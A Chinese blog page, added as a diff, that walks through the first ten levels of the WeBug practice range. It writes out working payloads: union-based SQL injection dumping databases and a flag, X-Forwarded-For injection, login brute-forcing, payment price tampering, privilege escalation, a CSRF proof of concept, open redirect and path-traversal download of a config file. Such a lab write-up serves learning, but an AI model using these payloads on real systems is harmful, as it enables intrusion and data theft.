@@ -1,0 +1,1400 @@
+<link href="https://louisnie.github.io/harlem-shake-style.css" rel="stylesheet" type="text/css">
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+
+
+  <meta name="keywords" content="靶机实验,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Louisnie" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="男儿不展同云志，空负天生八尺躯!   weBug环境介绍: WeBug名称定义为“我们的漏洞”靶场环境。基础环境是基于PHP/mysql制作搭建而成，中级环境与高级环境分别都是由互联网漏洞事件而收集的漏洞存在的操作环境。部分漏洞是基于Windows操作系统的漏洞。所以将WeBug的web环境都装在了一个纯净版的Windows 2003的虚拟机中，这个靶场基本包括了各种各样的常见漏洞，十分适合新手入">
+<meta name="keywords" content="靶机实验">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WebBug靶机基础实验">
+<meta property="og:url" content="https://louisnie.github.io/2019/02/25/WebBug靶机基础实验/index.html">
+<meta property="og:site_name" content="Louisnie">
+<meta property="og:description" content="男儿不展同云志，空负天生八尺躯!   weBug环境介绍: WeBug名称定义为“我们的漏洞”靶场环境。基础环境是基于PHP/mysql制作搭建而成，中级环境与高级环境分别都是由互联网漏洞事件而收集的漏洞存在的操作环境。部分漏洞是基于Windows操作系统的漏洞。所以将WeBug的web环境都装在了一个纯净版的Windows 2003的虚拟机中，这个靶场基本包括了各种各样的常见漏洞，十分适合新手入">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://wx2.sinaimg.cn/large/0078beR7ly1fz49iroc6rj31cw0cmq4d.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/0078beR7ly1fz49jkz2brj30mw0bqaad.jpg">
+<meta property="og:image" content="https://wx3.sinaimg.cn/large/0078beR7ly1fz49ltvkahj30pr0hcjs4.jpg">
+<meta property="og:image" content="https://wx1.sinaimg.cn/large/0078beR7ly1fz49p6ni54j30fz04sglt.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/0078beR7ly1fz49qx72ccj30nz0bdt9h.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/0078beR7ly1fz49rsttp7j30xi0f2q5d.jpg">
+<meta property="og:image" content="https://wx2.sinaimg.cn/large/0078beR7ly1fz49tu3be9j30nw0j10tu.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/0078beR7ly1fz49u05s0uj30te0ekt93.jpg">
+<meta property="og:image" content="https://wx4.sinaimg.cn/large/0078beR7ly1fz49wu5v3wj30zn0h8jsl.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/0078beR7ly1fz49x135e4j31fu0na40i.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/0078beR7ly1fz49yoefz6j30oc07cq3c.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/0078beR7ly1fz49zawg9nj31fk0nv48j.jpg">
+<meta property="og:image" content="https://wx2.sinaimg.cn/large/0078beR7ly1fz4a0y7p5wj30hy0b0jrm.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/0078beR7ly1fz4a1i0wtaj30te0db3zf.jpg">
+<meta property="og:image" content="https://wx3.sinaimg.cn/large/0078beR7ly1fz4a347hluj313s0j9gnj.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/0078beR7ly1fz4a49clxcj314o0jm11q.jpg">
+<meta property="og:image" content="https://wx4.sinaimg.cn/large/0078beR7ly1fz4a6su1i6j30ld07qwel.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/0078beR7ly1fz4a7b93lfj30ii0bxmxm.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/0078beR7ly1fz4a8l5gvaj30yc0kpwn9.jpg">
+<meta property="og:image" content="https://wx3.sinaimg.cn/large/0078beR7ly1fz4a91khr1j312e0aqq34.jpg">
+<meta property="og:image" content="https://wx3.sinaimg.cn/large/0078beR7ly1fz4aagdhbsj309501e0h3.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/0078beR7ly1fz4aakp6f3j30gc078dfu.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/0078beR7ly1fz4ab6can0j315x09v3zc.jpg">
+<meta property="og:image" content="https://wx1.sinaimg.cn/large/0078beR7ly1fz4ac4vqdej30g907zgmf.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/0078beR7ly1fz4acrxrf5j30xh0id0vu.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/0078beR7ly1fz4ad73mnbj31gz0h8q9h.jpg">
+<meta property="og:image" content="https://wx4.sinaimg.cn/large/0078beR7ly1fz4adj84dfj30wz0c50ud.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/0078beR7ly1fz4agqahytj30xu0dj0u1.jpg">
+<meta property="og:updated_time" content="2019-01-12T17:29:21.971Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="WebBug靶机基础实验">
+<meta name="twitter:description" content="男儿不展同云志，空负天生八尺躯!   weBug环境介绍: WeBug名称定义为“我们的漏洞”靶场环境。基础环境是基于PHP/mysql制作搭建而成，中级环境与高级环境分别都是由互联网漏洞事件而收集的漏洞存在的操作环境。部分漏洞是基于Windows操作系统的漏洞。所以将WeBug的web环境都装在了一个纯净版的Windows 2003的虚拟机中，这个靶场基本包括了各种各样的常见漏洞，十分适合新手入">
+<meta name="twitter:image" content="https://wx2.sinaimg.cn/large/0078beR7ly1fz49iroc6rj31cw0cmq4d.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://louisnie.github.io/2019/02/25/WebBug靶机基础实验/">
+
+
+
+
+
+  <title>WebBug靶机基础实验 | Louisnie</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<head><meta name="generator" content="Hexo 3.8.0">
+  <style>
+  /*.tags0{font-size: 12px !important;color: #ccc !important;}灰*/
+
+  .tags00{font-size: 12px !important;color: #666 !important;}/*黑*/
+  /*.tags01{font-size: 12px !important;color: rgb(255,128,128) !important;}红
+  .tags02{font-size: 12px !important;color: rgb(128,255,128) !important;}绿
+  .tags03{font-size: 12px !important;color: rgb(128,128,255) !important;}蓝
+  .tags04{font-size: 12px !important;color: rgb(255,216,128) !important;}黄*/
+
+  /*.tags10{font-size: 20px !important;color: #666 !important;}*/
+  .tags11{font-size: 20px !important;color: rgb(255,128,128) !important;}
+  .tags12{font-size: 20px !important;color: rgb(128,255,128) !important;}
+  .tags13{font-size: 20px !important;color: rgb(128,128,255) !important;}
+  .tags14{font-size: 20px !important;color: rgb(255,216,128) !important;}
+
+  /*.tags20{font-size: 40px !important;color: #666 !important;}*/
+  .tags21{font-size: 40px !important;color: rgb(255,128,128) !important;}
+  .tags22{font-size: 40px !important;color: rgb(128,255,128) !important;}
+  .tags23{font-size: 40px !important;color: rgb(128,128,255) !important;}
+  .tags24{font-size: 40px !important;color: rgb(255,216,128) !important;}
+  </style>
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+	
+	<a href="https://github.com/Louisnie/louisnie.github.io" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewbox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Louisnie</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Attitude determines Altitude!</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-schedule">
+          <a href="/schedule/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-calendar"></i> <br>
+            
+            日程表
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>
+            
+            站点地图
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://louisnie.github.io/2019/02/25/WebBug靶机基础实验/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Louisnie">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://i.loli.net/2018/10/22/5bcd762c46c2c.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Louisnie">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">WebBug靶机基础实验</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-02-25T01:38:25+08:00">
+                2019-02-25
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/WEB安全/" itemprop="url" rel="index">
+                    <span itemprop="name">WEB安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  2,312 字
+                </span>
+              
+
+              
+
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><blockquote class="blockquote-center">男儿不展同云志，空负天生八尺躯!</blockquote></p>
+<div align="middle"><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=526668900&auto=1&height=66"></iframe></div>
+
+<h2 id="weBug环境介绍"><a href="#weBug环境介绍" class="headerlink" title="weBug环境介绍:"></a>weBug环境介绍:</h2><blockquote>
+<p>WeBug名称定义为“我们的漏洞”靶场环境。基础环境是基于PHP/mysql制作搭建而成，中级环境与高级环境分别都是由互联网漏洞事件而收集的漏洞存在的操作环境。部分漏洞是基于Windows操作系统的漏洞。所以将WeBug的web环境都装在了一个纯净版的Windows 2003的虚拟机中，这个靶场基本包括了各种各样的常见漏洞，十分适合新手入门。</p>
+</blockquote>
+<h2 id="WeBug安装使用"><a href="#WeBug安装使用" class="headerlink" title="WeBug安装使用:"></a>WeBug安装使用:</h2><blockquote>
+<p>此安装包webug是3.0版本，所有的漏洞环境都已经搭建好了，解压后只要在vm虚拟机内打开，就可直接使用测试，无需繁琐的环境配置。<br>具体操作：用winrar将安装包解压，用VM虚拟机打开解压文件里的win2003虚拟机文件。进入虚拟机系统后，打开命令行，输入：ipconfig，查看虚拟机的IP地址，然后直接在物理机的浏览器上输入该IP地址，就可以直接进入靶场了。</p>
+</blockquote>
+<h2 id="WeBug包含的漏洞"><a href="#WeBug包含的漏洞" class="headerlink" title="WeBug包含的漏洞:"></a>WeBug包含的漏洞:</h2><blockquote>
+<p>目前该靶场包含以下漏洞（超全！特别适合练手）:<br>get注入；图片破解；信息收集练习——目录端口收集；暴力破解练习；x-forwarded-for注入；支付漏洞；垂直越权；CSRF；url跳转；GET任意文件下载；POST任意文件下载；无验证上传；反射型XSS；存储型XSS；校验扩展名上传；验证来源去向的url跳转；文件包含；POST文件包含；HOST注入；APK破解；延时注入；DZ7.2论坛sql注入；aspcms注入；phpmyadmin任意文件包含漏洞；齐博系统SQL注入；海盗云商getshell；PHP168任意代码执行GET SHELL；ecshop 注入；ShopXp系统SQL注射漏洞；Dcore(轻型CMS系统)注入漏洞；MetInfo 任意文件包含漏洞可getshell；Metinfo news.php盲注；Metinfo img.php盲注；万众电子期刊在线阅读系统PHP和ASP最新版本通杀SQL注入；BEESCMS sql注入，无视防御；ourphp 注入；phpwind 命令执行漏洞；metinfo  任意用户密码修改；DZ 3.2 存储型XSS；DedeCMS flink.php友情链接注入；DedeCms?recommend.php注入；BEESCMS 小于等于V4四处注入+无需密码直接进后台；海洋 x-forwarded-for注入；php截断利用；st2-016；jboss命令执行；tomcat弱口令；hfs远程命令执行；st2-052命令执行；flash远程命令执行；gh0st远程溢出；IIS6.0远程溢出<br>下载链接：<a href="https://pan.baidu.com/s/1h5tfc918DkLgk1fUAlnWNQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1h5tfc918DkLgk1fUAlnWNQ</a><br>提取码：cfyr </p>
+</blockquote>
+<h2 id="第一关-普通的GET注入"><a href="#第一关-普通的GET注入" class="headerlink" title="第一关:普通的GET注入"></a>第一关:普通的GET注入</h2><p>提交id为1,出现编号1的商品,输入1’,系统出现查询数据库错误的提示<br><img src="https://wx2.sinaimg.cn/large/0078beR7ly1fz49iroc6rj31cw0cmq4d.jpg" alt="image"><br>那么接下来爆系统SQL语句查询的字段个数,其payload为:<br>1’ order by 5–+<br><img src="https://ws1.sinaimg.cn/large/0078beR7ly1fz49jkz2brj30mw0bqaad.jpg" alt="image"><br>将数字5换成4,结果返回正常,证明其查询的字段数是4个</p>
+<p>然后爆字段所在位置,其payload为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.239.131/pentest/test/sqli/sqltamp.php?gid=1&apos;  union select 1,2,3,4--+</span><br></pre></td></tr></table></figure></p>
+<p>得到查询的字段分别位于”编号”,”名称”,”价格”,”数量”的位置<br><img src="https://wx3.sinaimg.cn/large/0078beR7ly1fz49ltvkahj30pr0hcjs4.jpg" alt="image"></p>
+<p>查询当前用户,数据库版本,当前数据库名,其payload为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.239.131/pentest/test/sqli/sqltamp.php?gid=1&apos;  union select 1,user(),version(),database()--+</span><br></pre></td></tr></table></figure></p>
+<p>当前用户:root@localhost<br>版本为:5.5.53<br>数据库名:pentesterlab<br>查所有数据库库名:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.239.131/pentest/test/sqli/sqltamp.php?gid=1&apos;  union select 1,2,3,group_concat(schema_name)from information_schema.schemata --+</span><br></pre></td></tr></table></figure></p>
+<p>得到的数据库为:<br>information_schema,beecms,dedecmsv57gbk,dedecmsv57gbksp1,deescms,discuz,<br>ecshop1,haidao,hiwiki,merinfo3,metinfo1,metinfo2,metinfoxiugai,mysql,<br>ourphp,pentesterlab,performance_schema,php168,phpwind,qibo,seacms,<br>test,ultrax,wanzhong,wiki,wiki11</p>
+<p>查当前数据库中的表:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.239.131/pentest/test/sqli/sqltamp.php?gid=1&apos;  union select 1,2,3,group_concat(table_name)from information_schema.tables where table_schema=&apos;pentesterlab&apos;--+</span><br></pre></td></tr></table></figure></p>
+<p>得到的当前数据库pentesterlab中的所有表名:comment,flag,goods,user</p>
+<p>查找flag表中的列名:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.239.131/pentest/test/sqli/sqltamp.php?gid=1&apos;  union select 1,2,3,group_concat(column_name)from information_schema.columns where table_name=&apos;flag&apos;--+</span><br></pre></td></tr></table></figure></p>
+<p>结果为:id,flag<br>查看其值:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.239.131/pentest/test/sqli/sqltamp.php?gid=1&apos;  union select 1,2,3,group_concat(id,0x7e,flag)from flag--+</span><br></pre></td></tr></table></figure></p>
+<p>结果为:<br>1~204f704fbbcf6acf398ffee11989b377</p>
+<h2 id="第二关-从图中你能找到什么"><a href="#第二关-从图中你能找到什么" class="headerlink" title="第二关: 从图中你能找到什么?"></a>第二关: 从图中你能找到什么?</h2><p>将图片保存到本地,notepad++打开就发现密码啦,官方说这道题有问题….<br><img src="https://wx1.sinaimg.cn/large/0078beR7ly1fz49p6ni54j30fz04sglt.jpg" alt="image"></p>
+<h2 id="第三关-你看到了什么"><a href="#第三关-你看到了什么" class="headerlink" title="第三关:你看到了什么?"></a>第三关:你看到了什么?</h2><p>查看源代码,原来是要扫目录呀,我用的是Windows系统,直接用御剑跑,Linux下可以用dirb或者dirbuster去跑</p>
+<p>扫到了这个test目录,得到提示把目录名md5加密<br><img src="https://ws3.sinaimg.cn/large/0078beR7ly1fz49qx72ccj30nz0bdt9h.jpg" alt="image"><br>访问加密后的值得到flag<br><img src="https://ws1.sinaimg.cn/large/0078beR7ly1fz49rsttp7j30xi0f2q5d.jpg" alt="image"></p>
+<h2 id="第四关-告诉你了FLAG是5位数"><a href="#第四关-告诉你了FLAG是5位数" class="headerlink" title="第四关:告诉你了FLAG是5位数"></a>第四关:告诉你了FLAG是5位数</h2><p>遇到表单上burp爆破<br><img src="https://wx2.sinaimg.cn/large/0078beR7ly1fz49tu3be9j30nw0j10tu.jpg" alt="image"><br>得到用户名admin.密码admin123<br>但是登录了没反应,后来发现是源码有问题,作者将flag注释了……<br><img src="https://ws2.sinaimg.cn/large/0078beR7ly1fz49u05s0uj30te0ekt93.jpg" alt="image"></p>
+<h2 id="第五关-一个优点小小的特殊的注入"><a href="#第五关-一个优点小小的特殊的注入" class="headerlink" title="第五关:一个优点小小的特殊的注入"></a>第五关:一个优点小小的特殊的注入</h2><p>X-Forwarded-For注入:<a href="http://" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/164817.html</a><br>两种方式解决这个问题(原理都是一样的)<br>1,用burpsuite抓包,添加X-Forwarded-For头部,其值为union select 1,2,3,group_concat(id,0x7e,flag)from flag<br><img src="https://wx4.sinaimg.cn/large/0078beR7ly1fz49wu5v3wj30zn0h8jsl.jpg" alt="image"><br>第二种方式:使用火狐浏览器的Modify Headers,添加添加X-Forwarded-For头部,其值为union select 1,2,3,group_concat(id,0x7e,flag)from flag,确定,刷新页面即可出现所查询的值<br><img src="https://ws3.sinaimg.cn/large/0078beR7ly1fz49x135e4j31fu0na40i.jpg" alt="image"></p>
+<h2 id="第六关-支付漏洞"><a href="#第六关-支付漏洞" class="headerlink" title="第六关:支付漏洞"></a>第六关:支付漏洞</h2><p>打开遇到个登录页面,爆破呗,得到账户名密码是tom/123456<br><img src="https://ws2.sinaimg.cn/large/0078beR7ly1fz49yoefz6j30oc07cq3c.jpg" alt="image"><br>看着很像支付漏洞,抓包修改价格为0.1元,购买成功<br><img src="https://ws4.sinaimg.cn/large/0078beR7ly1fz49zawg9nj31fk0nv48j.jpg" alt="image"></p>
+<h2 id="第七关-越权问题"><a href="#第七关-越权问题" class="headerlink" title="第七关:越权问题"></a>第七关:越权问题</h2><p>使用系统提供的账号密码登录<br>点击修改密码,发现是以GET请求的方式传递用户名进行修改密码的操作,那么尝试将用户名修改为admin用户,看能不能越权修改管理员账号<br>payload:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.239.131/pentest/test/3/change.php?name=admin</span><br></pre></td></tr></table></figure></p>
+<p>是可以修改admin的密码的,但是需要旧密码,</p>
+<p>查看其源码,只要输入的两次新密码正确就可以修改啦,不对原密码进行确认:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if($pwd2==$pwd3)&#123;</span><br><span class="line">	//更新记录</span><br><span class="line">$updateSql = &quot;update user set pwd = &apos;&quot;.$pwd2.&quot;&apos; where uid=&apos;&quot;.$uid.&quot;&apos;&quot;;</span><br><span class="line"></span><br><span class="line">$result = mysql_query($updateSql);</span><br><span class="line">if($result&gt;0)&#123;</span><br><span class="line">	echo &quot;&lt;script type=&apos;text/javascript&apos;&gt;alert(&apos;更改密码成功，请重新登录！&apos;);location.href=&apos;index.html&apos;&lt;/script&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://wx2.sinaimg.cn/large/0078beR7ly1fz4a0y7p5wj30hy0b0jrm.jpg" alt="image"></p>
+<h2 id="第八关-CSRF"><a href="#第八关-CSRF" class="headerlink" title="第八关:CSRF"></a>第八关:CSRF</h2><p>首先使用tom/123456登录,观察其URL为tom用户,将tom替换成admin即可修改管理员密码,然后输入新密码,burp抓包右键制作CSRF POC<br><img src="https://ws4.sinaimg.cn/large/0078beR7ly1fz4a1i0wtaj30te0db3zf.jpg" alt="image"><br>保存至一个HTML文件中,将访问该文件的网站链接发送给管理员,管理员一点击即可修改其密码为我刚刚修改之后的密码</p>
+<h2 id="第九关-URL跳转"><a href="#第九关-URL跳转" class="headerlink" title="第九关:URL跳转"></a>第九关:URL跳转</h2><p>查看源码,发现index.php存在任意url跳转<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$url=$_REQUEST[&apos;url&apos;];</span><br><span class="line">if($url!=null||$url!=&quot;&quot;)&#123;</span><br><span class="line">	echo &quot;&lt;script type=&apos;text/javascript&apos;&gt;alert(&apos;成功跳转！&apos;);location.href=&apos;&quot;.$url.&quot;&apos;&lt;/script&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>那么其payload为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.239.131/pentest/test/5/index.php?url=www.baidu.com</span><br></pre></td></tr></table></figure></p>
+<h2 id="第十关-GET类型任意下载漏洞"><a href="#第十关-GET类型任意下载漏洞" class="headerlink" title="第十关:GET类型任意下载漏洞"></a>第十关:GET类型任意下载漏洞</h2><p>打开链接提示404,查看源码源码又是源码写的有问题…..<br>我们直接去访问download.php<br><img src="https://wx3.sinaimg.cn/large/0078beR7ly1fz4a347hluj313s0j9gnj.jpg" alt="image"><br>网址为:<a href="http://192.168.239.131/pentest/test/6/1/download.php" target="_blank" rel="noopener">http://192.168.239.131/pentest/test/6/1/download.php</a><br>点击下载,发现传递了一个参数fname 是下载的文件名 那么可能可以修改文件名实现任意文件下载,其payload为:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.239.131/pentest/test/6/1/download.php?fname=../../../pentest/test/6/1/download.php</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws4.sinaimg.cn/large/0078beR7ly1fz4a49clxcj314o0jm11q.jpg" alt="image"><br>通过下载download.php这个文件证明存在任意文件下载漏洞,那么该去找存放管理员账号密码的文件<br>我直接使用御剑扫描其后台,发现在<a href="http://192.168.239.131/pentest/test/6/1/db/文件下存在config.php文件" target="_blank" rel="noopener">http://192.168.239.131/pentest/test/6/1/db/文件下存在config.php文件</a><br><img src="https://wx4.sinaimg.cn/large/0078beR7ly1fz4a6su1i6j30ld07qwel.jpg" alt="image"></p>
+<p>那么构造的payload为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.239.131/pentest/test/6/1/download.php?fname=../../../pentest/test/6/1/db/config.php</span><br></pre></td></tr></table></figure></p>
